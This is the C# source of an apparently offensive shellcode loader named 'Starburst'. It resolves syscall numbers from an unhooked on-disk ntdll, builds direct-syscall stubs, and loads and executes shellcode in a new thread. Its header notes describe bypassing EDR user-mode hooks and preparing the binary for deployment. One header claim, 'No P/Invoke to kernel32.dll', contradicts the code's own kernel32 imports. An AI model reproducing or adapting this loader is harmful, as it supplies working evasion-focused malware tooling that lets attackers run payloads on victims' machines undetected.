// ============================================================================
// Starburst C# D/Invoke Loader - Manual Syscall Invocation
// ============================================================================
// Compile: csc /unsafe /out:dinvoke.exe DInvoke.cs
// Usage:   dinvoke.exe [shellcode.bin]
//          If no argument, uses embedded shellcode byte array.
// OPSEC Notes:
//   - Avoids all user-mode API hooks by reading syscall numbers directly
//     from ntdll.dll on disk and invoking syscalls manually.
//   - No P/Invoke to kernel32.dll or ntdll.dll - all calls go through
//     dynamically-resolved syscall stubs.
//   - EDR products that rely on user-mode hooking (Inline hooks, IAT hooks)
//     are bypassed entirely.
//   - Kernel-mode ETW telemetry (e.g., Microsoft-Threat-Intelligence provider)
//     can still observe these syscalls.
//   - The technique of reading ntdll from disk is detectable if the EDR
//     monitors file access to system DLLs.
//   - .NET assembly metadata should be sanitized before deployment.
//   - This is the highest OPSEC option in the C# loader set.
// ============================================================================

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Starburst
{
    class DInvoke
    {
        // --- Structures ---
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 29)]
            public ushort[] e_res;
            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        // --- kernel32 for loading fresh ntdll copy ---
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr LoadLibraryEx(string lpLibFileName, IntPtr hFile, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // We still need VirtualAlloc for the syscall stub itself
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        // Constants
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint MEM_RELEASE = 0x8000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint INFINITE = 0xFFFFFFFF;
        const uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;

        // --- Syscall delegate types ---
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtAllocateVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtProtectVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtCreateThreadExDelegate(
            out IntPtr ThreadHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr StartRoutine,
            IntPtr Argument,
            uint CreateFlags,
            IntPtr ZeroBits,
            IntPtr StackSize,
            IntPtr MaximumStackSize,
            IntPtr AttributeList
        );

        // --- OPERATOR: Replace with actual shellcode bytes if not loading from file ---
        static byte[] embeddedShellcode = new byte[] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER - replace with real shellcode
        };

        /// <summary>
        /// Reads the syscall number from a fresh (unhooked) copy of ntdll.dll loaded
        /// from disk. The syscall stub pattern on x64 is:
        ///   4C 8B D1          mov r10, rcx
        ///   B8 XX XX 00 00    mov eax, <syscall_number>
        /// We extract the XX XX bytes as the syscall number.
        /// </summary>
        static int GetSyscallNumber(string functionName)
        {
            // Load a fresh copy of ntdll from disk (not the hooked in-memory copy)
            string ntdllPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System),
                "ntdll.dll"
            );

            IntPtr freshNtdll = LoadLibraryEx(ntdllPath, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
            if (freshNtdll == IntPtr.Zero)
            {
                throw new Exception("Failed to load fresh ntdll.dll copy");
            }

            try
            {
                IntPtr funcAddress = GetProcAddress(freshNtdll, functionName);
                if (funcAddress == IntPtr.Zero)
                {
                    throw new Exception("Failed to find " + functionName + " in ntdll.dll");
                }

                // Read the syscall stub bytes
                // Expected pattern: 4C 8B D1 B8 [syscall_number_lo] [syscall_number_hi] 00 00
                byte[] stub = new byte[8];
                Marshal.Copy(funcAddress, stub, 0, 8);

                // Verify the stub pattern
                if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8)
                {
                    // Extract syscall number (little-endian 16-bit value at offset 4)
                    return BitConverter.ToInt16(stub, 4);
                }

                throw new Exception("Unexpected syscall stub pattern for " + functionName);
            }
            finally
            {
                FreeLibrary(freshNtdll);
            }
        }

        /// <summary>
        /// Builds an executable syscall stub in memory for the given syscall number.
        /// The stub performs: mov r10, rcx; mov eax, <ssn>; syscall; ret
        /// </summary>
        static IntPtr BuildSyscallStub(int syscallNumber)
        {
            // Syscall stub bytes (x64):
            //   4C 8B D1              mov r10, rcx
            //   B8 XX XX 00 00        mov eax, <syscall_number>
            //   0F 05                 syscall
            //   C3                    ret
            byte[] stub = new byte[]
            {
                0x4C, 0x8B, 0xD1,                                          // mov r10, rcx
                0xB8, (byte)(syscallNumber), (byte)(syscallNumber >> 8), 0x00, 0x00,  // mov eax, SSN
                0x0F, 0x05,                                                // syscall
                0xC3                                                       // ret
            };

            // Allocate RW memory for stub
            IntPtr stubAddr = VirtualAlloc(
                IntPtr.Zero,
                (uint)stub.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );

            if (stubAddr == IntPtr.Zero)
            {
                throw new Exception("VirtualAlloc for syscall stub failed");
            }

            // Copy stub to allocated memory
            Marshal.Copy(stub, 0, stubAddr, stub.Length);

            // Flip to RX
            uint oldProtect;
            if (!VirtualProtect(stubAddr, (uint)stub.Length, PAGE_EXECUTE_READ, out oldProtect))
            {
                throw new Exception("VirtualProtect for syscall stub failed");
            }

            return stubAddr;
        }

        static void Main(string[] args)
        {
            byte[] shellcode;

            if (args.Length > 0 && File.Exists(args[0]))
            {
                try
                {
                    shellcode = File.ReadAllBytes(args[0]);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine("Error reading shellcode file: " + ex.Message);
                    return;
                }
            }
            else
            {
                shellcode = embeddedShellcode;
            }

            if (shellcode == null || shellcode.Length == 0)
            {
                Console.Error.WriteLine("Error: No shellcode to execute");
                return;
            }

            IntPtr currentProcess = GetCurrentProcess();
            IntPtr allocStub = IntPtr.Zero;
            IntPtr protectStub = IntPtr.Zero;
            IntPtr createThreadStub = IntPtr.Zero;

            try
            {
                // Resolve syscall numbers from a clean copy of ntdll
                int ssnAllocate = GetSyscallNumber("NtAllocateVirtualMemory");
                int ssnProtect = GetSyscallNumber("NtProtectVirtualMemory");
                int ssnCreateThread = GetSyscallNumber("NtCreateThreadEx");

                // Build syscall stubs
                allocStub = BuildSyscallStub(ssnAllocate);
                protectStub = BuildSyscallStub(ssnProtect);
                createThreadStub = BuildSyscallStub(ssnCreateThread);

                // Create delegates from the stubs
                var ntAllocate = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(
                    allocStub, typeof(NtAllocateVirtualMemoryDelegate)
                );

                var ntProtect = (NtProtectVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(
                    protectStub, typeof(NtProtectVirtualMemoryDelegate)
                );

                var ntCreateThread = (NtCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(
                    createThreadStub, typeof(NtCreateThreadExDelegate)
                );

                // Allocate RW memory via direct syscall
                IntPtr baseAddress = IntPtr.Zero;
                IntPtr regionSize = (IntPtr)shellcode.Length;

                uint status = ntAllocate(
                    currentProcess,
                    ref baseAddress,
                    IntPtr.Zero,
                    ref regionSize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE
                );

                if (status != 0)
                {
                    Console.Error.WriteLine("Error: NtAllocateVirtualMemory failed (0x" + status.ToString("X8") + ")");
                    return;
                }

                // Copy shellcode to allocated memory
                Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

                // Clear shellcode from managed memory
                Array.Clear(shellcode, 0, shellcode.Length);

                // Flip memory protection from RW to RX via direct syscall
                IntPtr protectAddress = baseAddress;
                IntPtr protectSize = (IntPtr)shellcode.Length;
                uint oldProtect;

                status = ntProtect(
                    currentProcess,
                    ref protectAddress,
                    ref protectSize,
                    PAGE_EXECUTE_READ,
                    out oldProtect
                );

                if (status != 0)
                {
                    Console.Error.WriteLine("Error: NtProtectVirtualMemory failed (0x" + status.ToString("X8") + ")");
                    return;
                }

                // Create thread via direct syscall
                IntPtr threadHandle;
                status = ntCreateThread(
                    out threadHandle,
                    0x1FFFFF, // THREAD_ALL_ACCESS
                    IntPtr.Zero,
                    currentProcess,
                    baseAddress,
                    IntPtr.Zero,
                    0,        // Not suspended
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero
                );

                if (status != 0)
                {
                    Console.Error.WriteLine("Error: NtCreateThreadEx failed (0x" + status.ToString("X8") + ")");
                    return;
                }

                // Wait for thread to complete
                WaitForSingleObject(threadHandle, INFINITE);
                CloseHandle(threadHandle);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                // Free syscall stubs
                if (allocStub != IntPtr.Zero)
                    VirtualFree(allocStub, 0, MEM_RELEASE);
                if (protectStub != IntPtr.Zero)
                    VirtualFree(protectStub, 0, MEM_RELEASE);
                if (createThreadStub != IntPtr.Zero)
                    VirtualFree(createThreadStub, 0, MEM_RELEASE);
            }
        }
    }
}
